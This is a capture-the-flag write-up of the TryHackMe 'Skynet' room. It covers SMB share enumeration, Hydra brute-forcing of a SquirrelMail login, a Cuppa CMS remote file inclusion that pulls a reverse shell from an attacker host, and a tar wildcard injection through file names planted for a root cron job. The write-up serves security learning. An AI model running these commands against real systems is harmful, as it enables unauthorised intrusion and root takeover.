# Write-up: Skynet [TryHackMe](https://tryhackme.com/room/skynet)

## Description
The Skynet room focuses on exploiting SMB shares and a vulnerable web CMS to gain system access, followed by privilege escalation to root. The main attack vectors were Cuppa CMS Remote File Inclusion (RFI) and a misconfigured cron job using tar.

## Port Scanning
```python
nmap -p- -A <IP>
```
Open ports:
```python
22/tcp SSH

80/tcp HTTP (Apache)

110/tcp POP3

139/tcp SMB (Samba)

143/tcp IMAP

445/tcp SMB (Samba)
```
## Web Enumeration
Directory Brute-force:
```python
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
Found ```/squirrelmail``` — a webmail interface with login, but no useful public exploits. We moved on to enumerating SMB shares.
## SMB Enumeration
Listing SMB shares:
```python
smbclient -L //<IP> -N
```
Interesting shares:

* anonymous — accessible without authentication

* milesdyson — requires credentials

Inside anonymous, we found:

* ```attention.txt```

Directory ```logs/``` with ```log1.txt```, ```log2.txt```, ```log3.txt```

In log1.txt we found a list of passwords.
```python
smbclient //10.10.84.128/anonymous -U "nothing" -c "recurse; prompt; mget *"
```

## Obtaining Credentials
We brute-forced SquirrelMail login using Hydra:
```python
hydra -l milesdyson -P logs/log1.txt <IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect."
```
Once logged in, we retrieved the SMB password for milesdyson from the inbox.
```python
smbclient //10.10.84.128/milesdyson -U milesdyson
```
We found the ```notes/important.txt``` file, revealing a hidden directory:
```python
mget important.txt
```
```python
/45kra24zxs28v3yd/
```
## Exploiting Cuppa CMS
Discovered ```/45kra24zxs28v3yd/administrator``` — running Cuppa CMS.

We exploited a Remote File Inclusion (RFI) vulnerability to execute our reverse shell:

1. Start HTTP server:
```python
python3 -m http.server 8000
```
2. Listen for reverse shell:
```python
nc -lvnp 4444
```
3. Trigger RFI exploit:

```python
http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:8000/shell.php
```
Reverse shell as www-data obtained.

## Privilege Escalation
Checking scheduled cron jobs:
```python
cat /etc/crontab
```
Found this:
```python
/home/milesdyson/backups/backup.sh
```
Contents:
```python
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
Vulnerability: tar with --checkpoint-action=exec allows code execution.

## Exploitation:

We prepared malicious files:
```python
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
touch "/var/www/html/--checkpoint=1"
```
After waiting for the cron job, we got a SUID bash:
```python
/bin/bash -p
```
Now we are root.
## Conclusion
Retrieve the flags:
```python
cat /home/milesdyson/user.txt
cat /root/root.txt
```

